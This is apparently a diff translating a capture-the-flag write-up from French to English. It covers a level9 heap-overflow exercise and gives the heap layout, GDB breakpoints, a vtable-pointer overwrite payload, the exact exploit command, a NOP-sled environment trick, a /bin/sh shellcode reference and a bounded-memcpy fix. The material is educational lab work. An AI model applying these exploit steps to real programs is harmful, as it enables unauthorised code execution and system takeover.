@@ -162,7 +162,7 @@ a:
 +0x68  value
 
 b:
-+0x00  vtable   ← cible
++0x00  vtable   ← target
 +0x04  annotation[100]
 +0x68  value
 ```
@@ -171,13 +171,13 @@ b:
 
 ```c
 typedef struct s_n {
-    void *vtable;          // 4 octets
-    char annotation[100]; // commence à l'offset 4
+    void *vtable;          // 4 bytes
+    char annotation[100]; // starts at offset 4
     int value;
 } N;
 ```
 
-### Heap layout (octets)
+### Heap layout (bytes)
 
 ```
 [ a chunk header : 8 bytes ]
@@ -209,7 +209,7 @@ a->annotation = a + 4 = 0x0804a00c
 0x08048660 <+108>:  mov    %eax,0x10(%esp)   ; b
 ```
 
-Breakpoint après mise en place de a et b :
+Breakpoint after a and b are set:
 
 ```bash
 (gdb) break *0x08048664
@@ -222,7 +222,7 @@ Breakpoint après mise en place de a et b :
 
 ---
 
-## GDB — appel virtuel
+## GDB — virtual call
 
 ```bash
 0x0804867c <+136>:   mov    0x10(%esp),%eax   ; eax = b
@@ -232,38 +232,38 @@ Breakpoint après mise en place de a et b :
 0x08048693 <+159>:   call   *%edx
 ```
 
-Breakpoint avant le call :
+Breakpoint before the call:
 
 ```bash
 (gdb) break *0x08048693
 ```
 
-Après overflow : `b->vptr = 0x0804a00c` (premier+4), donc `*(b->vptr) = *(0x0804a00c) = 0xbffffc03` (adresse shellcode).
+After overflow: `b->vptr = 0x0804a00c` (first+4), so `*(b->vptr) = *(0x0804a00c) = 0xbffffc03` (shellcode address).
 
 ---
 
 ## Payload argv[1]
 
 ```
-[ a->annotation first 4 ][ padding jusqu'à b->vptr ][ écrasement b->vptr ]
+[ a->annotation first 4 ][ padding to b->vptr ][ overwrite b->vptr ]
 [ 03 fc ff bf          ][ 42 42 42 42 ...         ][ 0c a0 04 08       ]
 ```
 
-En Python :
+In Python:
 
 ```bash
-"\x63\xfc\xff\xbf"   → adresse shellcode (little-endian)
+"\x63\xfc\xff\xbf"   → shellcode address (little-endian)
 "B"*104              → padding
-"\x0c\xa0\x04\x08"   → premier+4 (nouveau b->vptr)
+"\x0c\xa0\x04\x08"   → first+4 (new b->vptr)
 ```
 
-Commande :
+Command:
 
 ```bash
 ./level9 $(python -c 'print "\x03\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
 ```
 
-(Adapter l’adresse shellcode selon GDB ; souvent `\x63\xfc\xff\xbf` pour 0xbffffc63.)
+(Adjust shellcode address from GDB; often `\x63\xfc\xff\xbf` for 0xbffffc63.)
 
 ---
 
@@ -271,33 +271,33 @@ Commande :
 
 **NOP sled** : [NOP slide (Wikipedia)](https://en.wikipedia.org/wiki/NOP_slide)
 
-Séquence d’instructions NOP (`\x90` en x86) placée **avant** le shellcode. Un saut imprécis dans cette zone finit par atteindre le shellcode.
+Séquence d’instructions NOP (`\x90` on x86) placed **before** the shellcode. An imprecise jump into this region still hits the shellcode.
 
 ```
 [ shellcode ]
         ↑
-        il faut tomber EXACTEMENT ici ❌
+        must land EXACTLY here ❌
 
 [ NOP NOP NOP NOP NOP NOP NOP NOP ][ shellcode ]
   ↑         ↑           ↑
-  toutes ces adresses marchent ✅
+  all these addresses work ✅
 ```
 
-| Taille        | Effet                  |
-| ------------- | ---------------------- |
-| 10–50 bytes   | faible tolérance       |
-| 100–500 bytes | correct                |
-| 1000+ bytes   | très robuste (level9)  |
+| Size          | Effect                |
+| ------------- | --------------------- |
+| 10–50 bytes   | low tolerance         |
+| 100–500 bytes | reasonable            |
+| 1000+ bytes   | very robust (level9)  |
 
-`getenv("payload")` renvoie l’adresse du **début** de la valeur (début du NOP sled). Plusieurs adresses dans la zone sont valides (ex. 0xbffffc03, 0xbffffc63).
+`getenv("payload")` returns the **start** of the value (start of the NOP sled). Several addresses in the region are valid (e.g. 0xbffffc03, 0xbffffc63).
 
-En mémoire processus :
+Process memory:
 
 ```
-Adresse haute
+High address
 ┌───────────────────────────────┐
-│   ENVIRONNEMENT                │
-│   payload=NOP+shellcode        │  ← shellcode ici
+│   ENVIRONMENT                 │
+│   payload=NOP+shellcode        │  ← shellcode here
 ├───────────────────────────────┤
 │   ARGUMENTS (argv)             │
 │   argv[1] = overflow          │
@@ -310,14 +310,14 @@ Adresse haute
 ├───────────────────────────────┤
 │   CODE (.text)                 │
 └───────────────────────────────┘
-Adresse basse
+Low address
 ```
 
 ---
 
-## Helper — adresse de payload
+## Helper — payload address
 
-Pour afficher l’adresse de `payload` dans l’env (sans GDB) :
+To print the address of `payload` in the env (without GDB):
 
 ```c
 #include <stdio.h>
@@ -331,33 +331,33 @@ int main(void)
 }
 ```
 
-Sur la VM :
+On the VM:
 
 ```bash
 scp -P 4242 helper.c level9@localhost:/tmp
-# sur la VM :
+# on the VM:
 gcc /tmp/helper.c -o /tmp/helper
 env -i payload=$(python -c 'print "\x90"*1000 + "AAAA"') /tmp/helper
-# ex. output: payload at: 0xbffffc03
+# e.g. output: payload at: 0xbffffc03
 ```
 
-Voir `Ressources/helper.c`.
+See `Ressources/helper.c`.
 
 ---
 
-## Shellcode utilisé
+## Shellcode used
 
 **Linux x86 execve("/bin/sh") — 28 bytes**  
-Référence : [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira).
+Reference: [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira).
 
-Explication instruction par instruction : `shellcode_pas_a_pas.md`.  
-Résumé et octets : `shellcode.md`.
+Instruction-by-instruction explanation: `shellcode_pas_a_pas.md`.  
+Summary and bytes: `shellcode.md`.
 
 ---
 
-## Fix côté programme
+## Program-side fix
 
-Remplacer le memcpy sans borne par une copie limitée, par exemple :
+Replace the unbounded memcpy with a bounded copy, for example:
 
 ```c
 memcpy(this->annotation, s, strlen(s));
@@ -372,4 +372,4 @@ memcpy(this->annotation, s, n);
 this->annotation[n] = '\0';
 ```
 
-« Ne jamais copier plus de 100 octets. »
+"Never copy more than 100 bytes."
